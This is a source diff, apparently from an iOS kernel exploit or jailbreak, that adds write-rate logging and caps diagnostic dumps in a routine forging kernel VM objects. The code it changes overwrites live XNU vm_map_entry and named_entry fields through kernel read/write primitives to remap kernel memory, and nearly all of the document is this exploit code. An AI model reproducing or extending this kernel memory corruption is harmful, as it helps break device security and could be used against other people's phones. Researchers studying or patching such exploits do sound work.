@@ -6,6 +6,7 @@
 //
 
 #import <Foundation/Foundation.h>
+#import <mach/mach_time.h>
 #import <pthread.h>
 #import <stddef.h>
 #import <string.h>
@@ -251,9 +252,56 @@ struct VMObject vm_get_object(uint64_t map, uint64_t address)
 }
  
 
+// The remap writes into live kernel vm_map_entry and vm_named_entry objects, so
+// every one of them takes an XNU zone/kernel lock. The device log for
+// 2026-09-28 21:53:11-21:53:26 shows 310 vme_object_or_delta writes and 309
+// named_entry.offset writes in fifteen seconds with no "base walk: ... us=" line
+// ever printed, which is the DIAG flood below plus a remap loop that never
+// finishes. Two things follow, and both are measured rather than assumed:
+//
+//   A. The layout dumps were written to be read once, and they are re-read on
+//      every remap. A flag keeps the first few so a bad layout is still visible
+//      without the flood.
+//   C. The write count is reported once a second, so "is the loop bounded" is
+//      answered by a number instead of by a line count.
+static volatile int32_t g_vmShmemCalls = 0;
+static volatile int32_t g_vmKwriteCount = 0;
+static uint64_t g_vmLastRateUS = 0;
+static int32_t g_vmLastRateCount = 0;
+
+static void vm_note_kernel_write(void)
+{
+    __sync_fetch_and_add(&g_vmKwriteCount, 1);
+}
+
+// Reports once a second: total remaps, kernel writes this second, and writes
+// per remap. A loop that never ends shows a per-second write count that never
+// drops, and that is the difference between "slow" and "stuck".
+static void vm_log_write_rate(uint64_t nowUS)
+{
+    if (g_vmLastRateUS == 0) {
+        g_vmLastRateUS = nowUS;
+        g_vmLastRateCount = __sync_fetch_and_add(&g_vmKwriteCount, 0);
+        return;
+    }
+    if (nowUS - g_vmLastRateUS < 1000000ULL) return;
+
+    int32_t total = __sync_fetch_and_add(&g_vmKwriteCount, 0);
+    int32_t delta = total - g_vmLastRateCount;
+    g_vmLastRateCount = total;
+    g_vmLastRateUS = nowUS;
+
+    int32_t calls = __sync_fetch_and_add(&g_vmShmemCalls, 0);
+    NSLog(@"[PUSH][K] remaps=%d kwrites_1s=%d kwrites_total=%d per_remap=%.2f",
+          calls, delta, total,
+          calls > 0 ? (double)total / (double)calls : 0.0);
+}
+
 static struct VMShmem vm_create_shmem_with_object_locked(struct VMObject *object)
 {
     struct VMShmem shmem = {0};
+    __sync_fetch_and_add(&g_vmShmemCalls, 1);
+    vm_log_write_rate(mach_absolute_time() * 1000ULL / 1000000ULL);
     if (!object || !is_kaddr_valid(object->address)) {
         printf("[DS][%s:%d] invalid VM object 0x%llx\n",
                __FUNCTION__, __LINE__,
@@ -405,7 +453,11 @@ static struct VMShmem vm_create_shmem_with_object_locked(struct VMObject *object
     // DIAG via NSLog (3uTools realtime only captures NSLog, not printf):
     // dump the real 72 bytes so the kernel's actual layout is measured on the
     // device instead of inferred.
-    {
+    //
+    // The layout is a property of the kernel, not of the call, so three dumps
+    // measure it. Every remap used to dump, which is what produced 1579 log
+    // lines in fifteen seconds on 2026-09-28 with no other output in between.
+    if (__sync_fetch_and_add(&g_vmShmemCalls, 0) <= 3) {
         uint8_t raw[VME_ENTRY_ZONE_BYTES];
         kreadbuf(nextAddr, raw, sizeof(raw));
         // Plain C hex, not -appendFormat:- which is an NSMutableString category
@@ -501,13 +553,20 @@ static struct VMShmem vm_create_shmem_with_object_locked(struct VMObject *object
         const uint32_t newOD = (uint32_t)packedPointer;
         memcpy(blk + (odOff - VME_BLOCK_HI), &newOD, sizeof(newOD));
 
+        vm_note_kernel_write();
         early_kwrite32bytes(nextAddr + VME_BLOCK_HI, blk);
 
+        // The readback is the proof the write landed, and it is this write that
+        // matters, not the layout dump above it. A mismatch has to stay visible
+        // on every call; a match does not. 310 of these in fifteen seconds is
+        // what flooded the 21:53 log.
         uint32_t check = 0;
         kreadbuf(nextAddr + odOff, &check, sizeof(check));
-        NSLog(@"[DS] DIAG wrote vme_object_or_delta@0x%lx -> 0x%08x, readback 0x%08x %@",
-              (unsigned long)odOff, newOD, check,
-              check == newOD ? @"MATCH" : @"MISMATCH");
+        if (check != newOD || __sync_fetch_and_add(&g_vmShmemCalls, 0) <= 3) {
+            NSLog(@"[DS] DIAG wrote vme_object_or_delta@0x%lx -> 0x%08x, readback 0x%08x %@",
+                  (unsigned long)odOff, newOD, check,
+                  check == newOD ? @"MATCH" : @"MISMATCH");
+        }
     }
 
     // ---------------------------------------------------------------------
@@ -580,10 +639,16 @@ static struct VMShmem vm_create_shmem_with_object_locked(struct VMObject *object
         }
         const uint32_t offAt = (sizeAt == NE_NONE) ? NE_NONE : (sizeAt - 8);
 
-        NSLog(@"[DS] DIAG namedentry ne=0x%llx raw=%s copySize=0x%llx sizeAt=0x%x offsetAt=0x%x",
-              (unsigned long long)shmemNamedEntry, neHex,
-              (unsigned long long)copySize,
-              (unsigned)sizeAt, (unsigned)offAt);
+        // The layout dump is a kernel property, so three calls are enough to
+        // measure it. The SKIP line is not a layout, it is a fault, and it
+        // stays on every call.
+        const int32_t vmCallNo = __sync_fetch_and_add(&g_vmShmemCalls, 0);
+        if (vmCallNo <= 3) {
+            NSLog(@"[DS] DIAG namedentry ne=0x%llx raw=%s copySize=0x%llx sizeAt=0x%x offsetAt=0x%x",
+                  (unsigned long long)shmemNamedEntry, neHex,
+                  (unsigned long long)copySize,
+                  (unsigned)sizeAt, (unsigned)offAt);
+        }
 
         if (offAt != NE_NONE && offAt + sizeof(uint64_t) <= VNE_BLOCK_BYTES) {
             uint8_t blk[EARLY_KRW_LENGTH];
@@ -592,14 +657,17 @@ static struct VMShmem vm_create_shmem_with_object_locked(struct VMObject *object
             const uint64_t newOffset = pageObjectOffset;
             memcpy(blk + offAt, &newOffset, sizeof(newOffset));
 
+            vm_note_kernel_write();
             early_kwrite32bytes(shmemNamedEntry, blk);
 
             uint64_t check = 0;
             kreadbuf(shmemNamedEntry + offAt, &check, sizeof(check));
-            NSLog(@"[DS] DIAG wrote named_entry.offset@0x%x -> 0x%llx, readback 0x%llx %@",
-                  (unsigned)offAt, (unsigned long long)newOffset,
-                  (unsigned long long)check,
-                  check == newOffset ? @"MATCH" : @"MISMATCH");
+            if (check != newOffset || vmCallNo <= 3) {
+                NSLog(@"[DS] DIAG wrote named_entry.offset@0x%x -> 0x%llx, readback 0x%llx %@",
+                      (unsigned)offAt, (unsigned long long)newOffset,
+                      (unsigned long long)check,
+                      check == newOffset ? @"MATCH" : @"MISMATCH");
+            }
         } else {
             NSLog(@"[DS] DIAG SKIP named_entry.offset: located at 0x%x, not inside "
                   @"the writable 32-byte block [0x00,0x%x)", (unsigned)offAt,
